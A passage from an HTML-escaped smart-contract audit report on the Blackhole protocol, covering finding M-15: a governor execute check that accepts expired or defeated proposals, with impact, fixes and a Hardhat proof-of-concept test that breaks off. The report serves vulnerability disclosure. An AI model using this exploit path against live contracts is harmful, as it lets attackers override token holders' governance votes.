class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.startPrank(alice);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contractDelegates.useMoveTokenDeledates(1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.stopPrank();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.warp(block.timestamp + 100);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.startPrank(alice);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contractDelegates.useMoveTokenDeledates(2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        vm.stopPrank();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econsole.log(\u0026quot;ALICEs tokens:\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        logCheckpointTokenIds(contractDelegates.showData(alice, 1));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        logCheckpointTokenIds(contractDelegates.showData(alice, 2));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econsole.log(\u0026quot;BOBs tokens:\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        logCheckpointTokenIds(contractDelegates.showData(bob, 1));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // alice was supposed to have token 3 left in checkpoint, but she does not\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e//   ALICEs tokens:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        //   BOBs tokens:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        //   Token ID 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        //   Token ID 2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function logCheckpointTokenIds(VotingDelegationLib.Checkpoint memory cp) internal view {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 len = cp.tokenIds.length;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        for (uint256 i = 0; i \u0026lt; len; i++) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            console.log(\u0026quot;Token ID\u0026quot;, cp.tokenIds[i]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-4\"\u003elonelybones\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-54\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-65\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-15-l2governorexecute-accepts-expired--defeated-proposals-attacker-front-runs-blackgovernor-nudge-blocks-legitimate-emission-rate-votes-freezes-tail-emissions\" style=\"position:relative;\"\u003e\u003ca href=\"#m-15-l2governorexecute-accepts-expired--defeated-proposals-attacker-front-runs-blackgovernor-nudge-blocks-legitimate-emission-rate-votes-freezes-tail-emissions\" aria-label=\"m 15 l2governorexecute accepts expired  defeated proposals attacker front runs blackgovernor nudge blocks legitimate emission rate votes freezes tail emissions permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-21\"\u003e[M-15] \u003ccode\u003eL2Governor.execute()\u003c/code\u003e accepts \u003ccode\u003eExpired\u003c/code\u003e / \u003ccode\u003eDefeated\u003c/code\u003e proposals, attacker front-runs \u003ccode\u003eBlackGovernor\u003c/code\u003e \u003ccode\u003enudge()\u003c/code\u003e, blocks legitimate emission-rate votes, freezes tail emissions\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-33\"\u003elonelybones\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-139\"\u003edanzero\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-301\"\u003efrancoHacker\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-525\"\u003eharsh123\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-493\"\u003emahadev\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-31\"\u003ePocas\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-530\"\u003eRorschach\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L317-L320\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L317-L320\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-10\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-10\" aria-label=\"finding description 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eL2Governor.execute()\u003c/code\u003e function (in \u003ccode\u003econtracts/governance/L2Governor.sol\u003c/code\u003e, inherited by \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e) erroneously permits execution of \u003ccode\u003eExpired\u003c/code\u003e or \u003ccode\u003eDefeated\u003c/code\u003e proposals. An attacker can exploit this by executing an \u003ccode\u003eExpired\u003c/code\u003e proposal targeting \u003ccode\u003eMinterUpgradeable.nudge()\u003c/code\u003e. This action, due to a quirk in \u003ccode\u003enudge()\u003c/code\u003e’s status interpretation, sets a one-time-per-epoch flag, thereby blocking a legitimately Succeeded emission-change proposal for the same period and subverting voter consensus on tail emission rates.\u003c/p\u003e\n\u003cp\u003eThe root cause is an overly permissive state check in \u003ccode\u003eL2Governor.execute()\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003eFile: \u003ccode\u003econtracts/governance/Governor.sol#L317-L320\u003c/code\u003e (within \u003ccode\u003eL2Governor.execute()\u003c/code\u003e)\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDefeated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eExpired\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/* ... */\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// \u0026lt;\u0026lt;\u0026lt; FLAW\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis allows non-Succeeded proposals to proceed to execution. BlackGovernor.sol inherits this, and its \u003ccode\u003epropose()\u003c/code\u003e function restricts targets to \u003ccode\u003eMinterUpgradeable.nudge()\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eMinterUpgradeable.nudge()\u003c/code\u003e function contains a one-time-per-epoch guard (require (\u003ccode\u003e!proposals[_period], ...); proposals[_period] = true;\u003c/code\u003e). When \u003ccode\u003enudge()\u003c/code\u003e is called via the flawed \u003ccode\u003eexecute()\u003c/code\u003e, its call to \u003ccode\u003eIBlackGovernor.status()\u003c/code\u003e (no args) reads the \u003ccode\u003eL2Governor.status\u003c/code\u003e public state variable (defaulting to \u003ccode\u003eProposalState.Pending - 0\u003c/code\u003e). Consequently, \u003ccode\u003enudge()\u003c/code\u003e always takes its “no change” branch for \u003ccode\u003etailEmissionRate\u003c/code\u003e and sets the \u003ccode\u003eproposals[_period]\u003c/code\u003e flag.\u003c/p\u003e\n\u003ch3 id=\"impact-11\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-11\" aria-label=\"impact 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eAn attacker exploits this by front-running the execution of a Succeeded BlackGovernor proposal (for \u003ccode\u003eMinter.nudge()\u003c/code\u003e) with an \u003ccode\u003eExpired\u003c/code\u003e one for the same target emission period.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEmission rate manipulation:\u003c/strong\u003e The attacker forces the BLACK token’s tail emission rate trend to “no change,” overriding voter consensus (e.g., for an increase or decrease).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eGovernance subversion:\u003c/strong\u003e Legitimate, Succeeded proposals for \u003ccode\u003eMinter.nudge()\u003c/code\u003e for that epoch are rendered un-executable because the \u003ccode\u003eproposals[active_period]\u003c/code\u003e flag in \u003ccode\u003eMinterUpgradeable\u003c/code\u003e has already been set by the attacker’s transaction.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLow cost, significant consequence:\u003c/strong\u003e Any account can execute an Expired proposal, impacting a core tokenomic control mechanism. This leads to misaligned emission rates compared to voter intent, affecting rewards for LPs and veBLACK holders.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-10\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eA detailed Hardhat test script (\u003ccode\u003etest/GovernorExecuteGrief.test.js\u003c/code\u003e) demonstrating this vulnerability using the project’s in-scope contracts has been developed and verified.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eKey PoC steps summary:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSetup:\u003c/strong\u003e Deployed BlackGovernor, MinterUpgradeable, and all necessary dependencies. Advanced Minter to its tail emission phase. Proposer created \u003ccode\u003ePROP_EXPIRED\u003c/code\u003e and \u003ccode\u003ePROP_SUCCEED\u003c/code\u003e targeting \u003ccode\u003eMinter.nudge()\u003c/code\u003e for the same future emission period.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eState transitions:\u003c/strong\u003e \u003ccode\u003ePROP_EXPIRED\u003c/code\u003e reached state Expired (6). \u003ccode\u003ePROP_SUCCEED\u003c/code\u003e was voted to state Succeeded (4).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExploitation:\u003c/strong\u003e Attacker executed \u003ccode\u003ePROP_EXPIRED\u003c/code\u003e. This called \u003ccode\u003eMinter.nudge()\u003c/code\u003e, which set \u003ccode\u003eproposals[target_period] = true\u003c/code\u003e and \u003ccode\u003etailEmissionRate\u003c/code\u003e to “no change.”\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVerification:\u003c/strong\u003e A subsequent attempt to execute \u003ccode\u003ePROP_SUCCEED\u003c/code\u003e reverted (due to \u003ccode\u003eMinter.nudge()\u003c/code\u003e’s guard), blocking the intended emission rate change.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended Mitigation Steps\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCorrect \u003ccode\u003eL2Governor.execute()\u003c/code\u003e state check: Modify \u003ccode\u003econtracts/governance/Governor.sol#L317-L320\u003c/code\u003e to only allow execution of Succeeded proposals:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"62\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// In contracts/governance/Governor.sol L2Governor.execute()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e-           status == ProposalState.Succeeded || status == ProposalState.Defeated || status == ProposalState.Expired,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e-           \u0026quot;Governor: proposal not successful or defeated\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e+           status == ProposalState.Succeeded,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e+           \u0026quot;Governor: proposal not Succeeded\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eEnhance \u003ccode\u003eMinterUpgradeable.nudge()\u003c/code\u003e: The \u003ccode\u003enudge()\u003c/code\u003e function should not re-check proposal status if \u003ccode\u003eL2Governor.execute()\u003c/code\u003e is fixed. If status checking is still desired for some reason, it must be passed the \u003ccode\u003eproposalId\u003c/code\u003e to correctly query \u003ccode\u003eBlackGovernor.state(proposalId)\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"coded-proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#coded-proof-of-concept\" aria-label=\"coded proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eCoded Proof of Concept\u003c/h3\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"63\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { expect } = require(\u0026quot;chai\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { ethers, upgrades } = require(\u0026quot;hardhat\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003easync function advanceTime(time) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await ethers.provider.send(\u0026quot;evm_increaseTime\u0026quot;, [time]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await ethers.provider.send(\u0026quot;evm_mine\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst CONTRACT_WEEK = 900; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst ZERO_ADDRESS = ethers.constants.AddressZero;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003efunction calculateEpochNextJS(timestamp) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const weekDuration = ethers.BigNumber.from(CONTRACT_WEEK);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tsBN = ethers.BigNumber.from(timestamp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return tsBN.sub(tsBN.mod(weekDuration)).add(weekDuration);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;BlackGovernor - Griefing Attack via Flawed L2Governor.execute()\u0026quot;, function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let deployer, proposerEOA, smVoter1EOA, smVoter2EOA, attackerEOA, teamEOA;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let blackToken, permissionsRegistry, tokenHandler, votingEscrow, rewardsDistributor;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let pairGenerator, pairFactory, bribeFactoryV3, gaugeFactoryV2, gaugeFactoryCL;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let algebraPoolAPIStorage; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let voterV3; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let gaugeManager, minterUpgradeable, blackGovernor;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let votingBalanceLogic, voterFactoryLib; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let nudgeCalldata;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    beforeEach(async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [deployer, proposerEOA, smVoter1EOA, smVoter2EOA, attackerEOA, teamEOA] = await ethers.getSigners();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Starting beforeEach: Deploying ALL REAL in-scope contracts...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VotingBalanceLogicFactory = await ethers.getContractFactory(\u0026quot;VotingBalanceLogic\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        votingBalanceLogic = await VotingBalanceLogicFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingBalanceLogic.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VoterFactoryLibFactory = await ethers.getContractFactory(\u0026quot;VoterFactoryLib\u0026quot;, deployer); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        voterFactoryLib = await 